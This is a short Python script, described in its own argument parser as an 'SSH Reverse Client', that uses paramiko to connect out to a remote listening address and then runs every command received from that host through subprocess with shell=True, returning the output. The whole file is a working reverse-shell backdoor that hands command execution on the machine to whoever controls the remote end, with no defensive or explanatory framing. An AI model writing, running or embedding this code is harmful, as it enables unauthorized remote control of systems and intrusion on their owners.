import argparse
import paramiko
import shlex
import subprocess

def ssh_command(ip,port,user,passwd,command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,port=port,username=user,password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd),shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='SSH Reverse Client')
    parser.add_argument('-u','--user',required=True,help='Username')
    parser.add_argument('-i','--address',required=True,help='Remote listening ip address')
    parser.add_argument('-p','--port',required=True,type=int ,help='Port Number')
    args = parser.parse_args()
    import getpass
    password = getpass.getpass()
    user = args.user
    ip = args.address
    port = args.port
    ssh_command(ip,port,user,password,'ClientConnected')